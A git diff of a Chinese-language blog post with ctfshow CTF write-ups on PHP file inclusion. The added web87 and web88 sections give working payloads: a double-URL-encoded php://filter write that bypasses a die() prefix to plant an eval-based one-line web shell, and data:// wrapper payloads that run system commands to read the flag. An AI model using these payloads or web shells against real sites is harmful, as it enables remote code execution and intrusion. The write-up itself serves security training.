@@ -54,8 +54,11 @@
 <meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web118_1.png">
 <meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web80_1.png">
 <meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web81_1.png">
+<meta property="og:image" content="http://m21in.github.io/imegas/ctfshow/ctfshow_web87_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web88_1.png">
+<meta property="og:image" content="http://m21in.github.io/images/ctfshow/ctfshow_web88_2.png">
 <meta property="article:published_time" content="2025-01-19T10:22:17.000Z">
-<meta property="article:modified_time" content="2025-03-25T23:48:13.152Z">
+<meta property="article:modified_time" content="2025-04-02T08:44:14.454Z">
 <meta property="article:author" content="M21in">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="RCE">
@@ -151,17 +154,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>
 
   </li>
   </ul>
@@ -222,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-26 07:48:13" itemprop="dateModified" datetime="2025-03-26T07:48:13+08:00">2025-03-26</time>
+                <time title="修改时间：2025-04-02 16:44:14" itemprop="dateModified" datetime="2025-04-02T16:44:14+08:00">2025-04-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -492,7 +495,23 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat fl0g.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 <p>源代码就能看到flag文件</p>
 <h2 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h2><p>条件竞争，跳过了</p>
-<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2>
+<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先审计代码，代码里要get传参file，post传参content，还有一个urldecode函数，代码里会对file传的参进行一次url解码，网页会自动进行一次解码，所以要进行两次url编码，用filter伪协议，写入一个木马文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-encode/resource=shell.php</span></span><br></pre></td></tr></table></figure>
+<p>进行两次url编码变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
+<p>那么现在get传参的问题解决了，现在要post传参绕过die函数<br>上网搜了一下，用base64编码可以绕过die函数<br>但是base64支持的字符只有64个，所以&lt;?php die()&gt; 里面的&lt;?()&gt; 这些特殊字符会被忽略掉，只看phpdie，并对他进行base64解码，但是base64解码的话，得要四个字节一组，所以得在后面添加两个字符，才能对他进行base64解码<br>前面是phpdie，加上任意两个字符，例如aa,bb,11 然后再加上一句话木马想写入的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">PD9waHAgQGV2YWwoJF9HRVRbImNtZCJdKTsgPz4=</span><br></pre></td></tr></table></figure>
+<p>在之前加上aa,再进行传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgQGV2YWwoJF9HRVRbImNtZCJdKTsgPz4=</span><br></pre></td></tr></table></figure>
+<p>成功之后访问shell.php,参数cmd传参<br><img src="/imegas/ctfshow/ctfshow_web87_1.png"><br>查看fl0g.php,flag在源代码里</p>
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以用data伪协议，执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/ctfshow/ctfshow_web88_1.png"><br>可以看到正常base64加密是多一个&#x3D;的，但是实际传参传&#x3D;的时候，会进入代码的黑名单里，从而报错<br>所以不要加&#x3D;，实际base64传参的结果也是正确的<br><img src="/images/ctfshow/ctfshow_web88_2.png"><br>最终paylad：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbDBnLnBocCIpPz4</span></span><br></pre></td></tr></table></figure>
+<p>base64解码是 <?php system("nl fl0g.php")?><br>原base64编码有&#x3D;号，防止被黑名单过滤，要去掉&#x3D;，且不能出现+号</p>
+<h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2>
     </div>
 
     
@@ -574,7 +593,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web29"><span class="nav-number">1.1.</span> <span class="nav-text">web29</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web30"><span class="nav-number">1.2.</span> <span class="nav-text">web30</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web31"><span class="nav-number">1.3.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web32"><span class="nav-number">1.4.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web33"><span class="nav-number">1.5.</span> <span class="nav-text">web33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web34"><span class="nav-number">1.6.</span> <span class="nav-text">web34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web35"><span class="nav-number">1.7.</span> <span class="nav-text">web35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web36"><span class="nav-number">1.8.</span> <span class="nav-text">web36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web37"><span class="nav-number">1.9.</span> <span class="nav-text">web37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38"><span class="nav-number">1.10.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web39"><span class="nav-number">1.11.</span> <span class="nav-text">web39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web40"><span class="nav-number">1.12.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41"><span class="nav-number">1.13.</span> <span class="nav-text">web41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42"><span class="nav-number">1.14.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web43"><span class="nav-number">1.15.</span> <span class="nav-text">web43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web44"><span class="nav-number">1.16.</span> <span class="nav-text">web44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web45"><span class="nav-number">1.17.</span> <span class="nav-text">web45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web46"><span class="nav-number">1.18.</span> <span class="nav-text">web46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web47"><span class="nav-number">1.19.</span> <span class="nav-text">web47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web48"><span class="nav-number">1.20.</span> <span class="nav-text">web48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web49"><span class="nav-number">1.21.</span> <span class="nav-text">web49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">1.22.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web51"><span class="nav-number">1.23.</span> <span class="nav-text">web51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52"><span class="nav-number">1.24.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web53"><span class="nav-number">1.25.</span> <span class="nav-text">web53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web54"><span class="nav-number">1.26.</span> <span class="nav-text">web54</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web55"><span class="nav-number">1.27.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web56"><span class="nav-number">1.28.</span> <span class="nav-text">web56</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web57"><span class="nav-number">1.29.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web58"><span class="nav-number">1.30.</span> <span class="nav-text">web58</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web59"><span class="nav-number">1.31.</span> <span class="nav-text">web59</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web60"><span class="nav-number">1.32.</span> <span class="nav-text">web60</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web61"><span class="nav-number">1.33.</span> <span class="nav-text">web61</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web62"><span class="nav-number">1.34.</span> <span class="nav-text">web62</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web63"><span class="nav-number">1.35.</span> <span class="nav-text">web63</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web64"><span class="nav-number">1.36.</span> <span class="nav-text">web64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web65"><span class="nav-number">1.37.</span> <span class="nav-text">web65</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web66"><span class="nav-number">1.38.</span> <span class="nav-text">web66</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web67"><span class="nav-number">1.39.</span> <span class="nav-text">web67</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web68"><span class="nav-number">1.40.</span> <span class="nav-text">web68</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web69"><span class="nav-number">1.41.</span> <span class="nav-text">web69</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web70"><span class="nav-number">1.42.</span> <span class="nav-text">web70</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web71"><span class="nav-number">1.43.</span> <span class="nav-text">web71</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web72"><span class="nav-number">1.44.</span> <span class="nav-text">web72</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web73"><span class="nav-number">1.45.</span> <span class="nav-text">web73</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web74"><span class="nav-number">1.46.</span> <span class="nav-text">web74</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web75"><span class="nav-number">1.47.</span> <span class="nav-text">web75</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web76"><span class="nav-number">1.48.</span> <span class="nav-text">web76</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web77"><span class="nav-number">1.49.</span> <span class="nav-text">web77</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web118"><span class="nav-number">1.50.</span> <span class="nav-text">web118</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web119"><span class="nav-number">1.51.</span> <span class="nav-text">web119</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web120"><span class="nav-number">1.52.</span> <span class="nav-text">web120</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web121"><span class="nav-number">1.53.</span> <span class="nav-text">web121</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web122"><span class="nav-number">1.54.</span> <span class="nav-text">web122</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web124"><span class="nav-number">1.55.</span> <span class="nav-text">web124</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web78"><span class="nav-number">2.1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">2.2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80"><span class="nav-number">2.3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81"><span class="nav-number">2.4.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web82-86"><span class="nav-number">2.5.</span> <span class="nav-text">web82-86</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web87"><span class="nav-number">2.6.</span> <span class="nav-text">web87</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web29"><span class="nav-number">1.1.</span> <span class="nav-text">web29</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web30"><span class="nav-number">1.2.</span> <span class="nav-text">web30</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web31"><span class="nav-number">1.3.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web32"><span class="nav-number">1.4.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web33"><span class="nav-number">1.5.</span> <span class="nav-text">web33</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web34"><span class="nav-number">1.6.</span> <span class="nav-text">web34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web35"><span class="nav-number">1.7.</span> <span class="nav-text">web35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web36"><span class="nav-number">1.8.</span> <span class="nav-text">web36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web37"><span class="nav-number">1.9.</span> <span class="nav-text">web37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web38"><span class="nav-number">1.10.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web39"><span class="nav-number">1.11.</span> <span class="nav-text">web39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web40"><span class="nav-number">1.12.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41"><span class="nav-number">1.13.</span> <span class="nav-text">web41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42"><span class="nav-number">1.14.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web43"><span class="nav-number">1.15.</span> <span class="nav-text">web43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web44"><span class="nav-number">1.16.</span> <span class="nav-text">web44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web45"><span class="nav-number">1.17.</span> <span class="nav-text">web45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web46"><span class="nav-number">1.18.</span> <span class="nav-text">web46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web47"><span class="nav-number">1.19.</span> <span class="nav-text">web47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web48"><span class="nav-number">1.20.</span> <span class="nav-text">web48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web49"><span class="nav-number">1.21.</span> <span class="nav-text">web49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">1.22.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web51"><span class="nav-number">1.23.</span> <span class="nav-text">web51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52"><span class="nav-number">1.24.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web53"><span class="nav-number">1.25.</span> <span class="nav-text">web53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web54"><span class="nav-number">1.26.</span> <span class="nav-text">web54</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web55"><span class="nav-number">1.27.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web56"><span class="nav-number">1.28.</span> <span class="nav-text">web56</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web57"><span class="nav-number">1.29.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web58"><span class="nav-number">1.30.</span> <span class="nav-text">web58</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web59"><span class="nav-number">1.31.</span> <span class="nav-text">web59</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web60"><span class="nav-number">1.32.</span> <span class="nav-text">web60</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web61"><span class="nav-number">1.33.</span> <span class="nav-text">web61</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web62"><span class="nav-number">1.34.</span> <span class="nav-text">web62</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web63"><span class="nav-number">1.35.</span> <span class="nav-text">web63</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web64"><span class="nav-number">1.36.</span> <span class="nav-text">web64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web65"><span class="nav-number">1.37.</span> <span class="nav-text">web65</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web66"><span class="nav-number">1.38.</span> <span class="nav-text">web66</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web67"><span class="nav-number">1.39.</span> <span class="nav-text">web67</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web68"><span class="nav-number">1.40.</span> <span class="nav-text">web68</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web69"><span class="nav-number">1.41.</span> <span class="nav-text">web69</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web70"><span class="nav-number">1.42.</span> <span class="nav-text">web70</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web71"><span class="nav-number">1.43.</span> <span class="nav-text">web71</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web72"><span class="nav-number">1.44.</span> <span class="nav-text">web72</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web73"><span class="nav-number">1.45.</span> <span class="nav-text">web73</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web74"><span class="nav-number">1.46.</span> <span class="nav-text">web74</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web75"><span class="nav-number">1.47.</span> <span class="nav-text">web75</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web76"><span class="nav-number">1.48.</span> <span class="nav-text">web76</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web77"><span class="nav-number">1.49.</span> <span class="nav-text">web77</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web118"><span class="nav-number">1.50.</span> <span class="nav-text">web118</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web119"><span class="nav-number">1.51.</span> <span class="nav-text">web119</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web120"><span class="nav-number">1.52.</span> <span class="nav-text">web120</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web121"><span class="nav-number">1.53.</span> <span class="nav-text">web121</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web122"><span class="nav-number">1.54.</span> <span class="nav-text">web122</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web124"><span class="nav-number">1.55.</span> <span class="nav-text">web124</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web78"><span class="nav-number">2.1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">2.2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80"><span class="nav-number">2.3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81"><span class="nav-number">2.4.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web82-86"><span class="nav-number">2.5.</span> <span class="nav-text">web82-86</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web87"><span class="nav-number">2.6.</span> <span class="nav-text">web87</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web88"><span class="nav-number">2.7.</span> <span class="nav-text">web88</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web116"><span class="nav-number">2.8.</span> <span class="nav-text">web116</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -590,20 +609,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
